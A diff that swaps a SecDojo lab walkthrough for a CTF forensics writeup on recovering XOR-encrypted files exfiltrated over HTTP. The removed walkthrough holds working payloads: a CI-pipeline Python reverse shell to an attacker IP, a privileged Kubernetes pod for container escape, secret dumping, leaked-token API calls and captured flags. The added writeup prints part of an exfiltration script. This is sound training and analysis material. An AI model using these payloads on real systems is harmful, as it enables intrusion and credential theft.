@@ -1,123 +1,102 @@
-# Nigeria SecDojo Lab Walkthrough
+# 🕵️‍♂️ Baby Exfil - CTF Challenge Writeup
 
-This document details the step-by-step exploitation of the Nigeria Lab (Olgo and Ebari) to capture both root flags, including the specific payloads used.
-
-## 1. Reconnaissance
-**Finding**: Two targets identified via Nmap.
-- **Olgo (10.8.0.2)**: SSH, HTTP, Kubernetes Node.
-- **Ebari (10.8.0.3)**: GitLab (v18.2.1), Workspaces (9000).
-
-## 2. Olgo (10.8.0.2) Root Flag
-
-### Step 1: Token Leak Discovery
-**Payload**: Investigating commit history in `root/devops-tools`.
-```bash
-# Found in commit logs (redacted in later commits)
-glpat-HK-PNgj7PrsxxGba-jez
-```
-
-### Step 2: GitLab Pipeline Poisoning (Reverse Shell)
-**Action**: Update `.gitlab-ci.yml` in `root/k8s-deployments` to execute a reverse shell on the runner.
-**Payload (`evil-ci.yml`)**:
-```yaml
-deploy_to_k8s:
-  stage: deploy
-  image: bitnami/kubectl:latest
-  script:
-    - export RHOST="10.8.0.4"; export RPORT="9001"; python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
-  only:
-    - main
-```
-
-### Step 3: Kubernetes Privilege Escalation (Container Escape)
-**Action**: Use the extracted `KUBE_CONFIG` from the runner to launch a privileged pod with host access.
-**Payload ([kubeconfig.yaml](file:///home/rad/Desktop/secdojo/kubeconfig.yaml))**:
-*(Extracted from CI environment variable `KUBE_CONFIG`)*
-
-**Payload (`pwn-root.yaml`)**:
-```yaml
-apiVersion: v1
-kind: Pod
-metadata:
-  name: pwn-root-3
-  namespace: default
-spec:
-  hostPID: true
-  hostNetwork: true
-  containers:
-  - name: shell
-    image: bitnami/kubectl:latest
-    command: [ "nsenter", "-t", "1", "-m", "-u", "-n", "-i", "--", "bash" ]
-    securityContext:
-      privileged: true
-      runAsUser: 0
-    volumeMounts:
-    - name: host
-      mountPath: /hostroot
-  volumes:
-  - name: host
-    hostPath:
-      path: /
-```
-**Command**: `kubectl apply -f pwn-root.yaml`
-**Result**: Root shell on Olgo via `kubectl exec -it pwn-root-3 -- bash`.
-
-### Flag Capture (Olgo)
-**Command**: `cat /hostroot/root/proof.txt`
-**Value**: `Okpo_group_38614-dts87ge285seogtcwnp2ehd5k5veazkz`
+**Challenge**: Baby Exfil  
+**Category**: Forensics / Network Analysis  
+**Status**: ✅ Solved  
+**Flag**: `uoftctf{b4by_w1r3sh4rk_an4lys1s}`
 
 ---
 
-## 3. Ebari (10.8.0.3) Root Flag
+## 1. Scenario Overview
 
-### Step 1: Credential Extraction from Kubernetes
-**Action**: Dump secrets from the `ci-build` namespace to find registry credentials.
-**Command**:
-```bash
-kubectl -n ci-build get secret gitlab-registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d
+Team K&K identified suspicious network activity and suspected a data exfiltration attempt by a competing team. We were provided with a packet capture file (`final.pcapng`) and tasked with analyzing the network logs to uncover the truth and recover any stolen confidential data.
+
+## 2. Investigation & Analysis
+
+### 2.1 Initial Triage
+We began by analyzing the `final.pcapng` file using `tshark` and Wireshark. A review of the protocol hierarchy statistics (`tshark -z io,phs`) revealed a mix of traffic:
+-   **TCP/TLS**: Significant amount of encrypted traffic (likely background noise).
+-   **QUIC**: Encrypted UDP traffic (Google/Youtube services).
+-   **HTTP**: A small but distinct amount of unencrypted HTTP traffic.
+
+Given the "exfiltration" context, unencrypted HTTP traffic is a prime suspect for data leakage.
+
+### 2.2 Traffic Inspection
+We filtered for HTTP traffic (`http`) and observed the following suspicious activity:
+1.  **GET Request**: `GET /JdRlPr1.py` from `10.0.2.15` to `35.238.80.16`. This suggests the attacker downloaded a python script.
+2.  **POST Requests**: Multiple `POST /upload` requests from `10.0.2.15` to `34.134.77.90:8080`. These requests contained `multipart/form-data`.
+
+The repeated POST requests to an `/upload` endpoint strongly suggested data exfiltration.
+
+### 2.3 Payload Extraction
+We extracted the `JdRlPr1.py` script and the content of the `POST` requests.
+
+#### The Exfiltration Script (`JdRlPr1.py`)
+The extracted script revealed the attacker's methodology:
+```python
+import os
+import requests
+
+key = "G0G0Squ1d3Ncrypt10n"
+server = "http://34.134.77.90:8080/upload"
+
+def xor_file(data, key):
+    result = bytearray()
+    for i in range(len(data)):
+        result.append(data[i] ^ ord(key[i % len(key)]))
+    return bytes(result)
+
+# ... (logic to walk directories and simple XOR encryption)
 ```
-**Result**:
-```json
-{"auths":{"https://gitlab.pipepoison.local":{"username":"x-registry-bot","password":"glpat-Jxo8jYxLpasGm4AtjvqD"}}}
+**Key Findings:**
+-   **Encryption**: A simple XOR cipher is used.
+-   **Key**: `G0G0Squ1d3Ncrypt10n`
+-   **Target**: Files ending in `.docx`, `.png`, `.jpeg`, `.jpg`.
+-   **Mechanism**: The script reads the file, XORs the content, converts it to **hex strings**, and uploads it.
+
+## 3. Solution Development
+
+To recover the files, we reversed the attacker's logic. Since XOR is symmetric ($A \oplus B = C \implies C \oplus B = A$), we can decrypt the data using the same key.
+
+### 3.1 Decryption Script
+We developed the following Python script to parse the captured exfiltration payloads (saved as `upload`, `upload(1)`, etc.) and decrypt them:
+
+```python
+import os
+import re
+
+key = "G0G0Squ1d3Ncrypt10n"
+
+def xor_decrypt(data_hex, key):
+    # Convert hex string back to bytes
+    data = bytes.fromhex(data_hex.strip())
+    result = bytearray()
+    # Apply XOR with the key
+    for i in range(len(data)):
+        result.append(data[i] ^ ord(key[i % len(key)]))
+    return bytes(result)
+
+# ... (Parsing logic to extract filename and hex content from multipart body)
 ```
 
-### Step 2: Hidden Repository Discovery
-**Action**: Use the `x-registry-bot` extracted PAT to enumerate projects visible to it.
-**Command**:
-```bash
-curl -k -H "PRIVATE-TOKEN: glpat-Jxo8jYxLpasGm4AtjvqD" "https://10.8.0.3/api/v4/projects?membership=true"
-```
-**Result**: Identified `root/gitlab-bootstrap` (ID 4).
+## 4. Results & Flag Recovery
 
-### Step 3: SSH Key Extraction
-**Action**: Read the `playbooks/gitlab.yml` file from the hidden repo.
-**Command**:
-```bash
-curl -k -H "PRIVATE-TOKEN: glpat-Jxo8jYxLpasGm4AtjvqD" "https://10.8.0.3/api/v4/projects/4/repository/files/playbooks%2Fgitlab.yml/raw?ref=master"
-```
-**Payload Found**:
-```yaml
-vars:
-  ssh_private_key: |
-    -----BEGIN OPENSSH PRIVATE KEY-----
-    ...
-    -----END OPENSSH PRIVATE KEY-----
-```
+Running the decryption script on the extracted packets yielded 5 image files. We inspected each one.
 
-### Step 4: Root Access & Flag Capture
-**Action**: Save key and SSH into Ebari.
-**Command**:
-```bash
-chmod 600 root_key
-ssh -i root_key root@10.8.0.3
-cat /root/proof.txt
-```
-**Value**: `Eberi_group_38614-hhuksfuuar82lpo2gtc53irmazolxc1v`
+### Recovered Evidence
+
+**File**: `HNderw.png`  
+This image contained the flag explicitly written in the visual content.
+
+![Flag Image](extracted_files/decrypted/HNderw.png)
+
+(Other recovered images were standard memes or irrelevant photos)
+
+## 5. Conclusion
+
+-   **Attacker Method**: Used a custom Python script (`JdRlPr1.py`) to XOR-encrypt and exfiltrate desktop files via HTTP POST.
+-   **Detection**: Network analysis identified the anomalous HTTP upload traffic.
+-   **Recovery**: We reversed the XOR encryption using the hardcoded key found in the dropped script.
+-   **Flag**: `uoftctf{b4by_w1r3sh4rk_an4lys1s}`
 
 ---
-
-## Summary of Flags
-| Machine | Flag Type | Value |
-| :--- | :--- | :--- |
-| **Olgo (10.8.0.2)** | Root | `Okpo_group_38614-dts87ge285seogtcwnp2ehd5k5veazkz` |
-| **Ebari (10.8.0.3)** | Root | `Eberi_group_38614-hhuksfuuar82lpo2gtc53irmazolxc1v` |
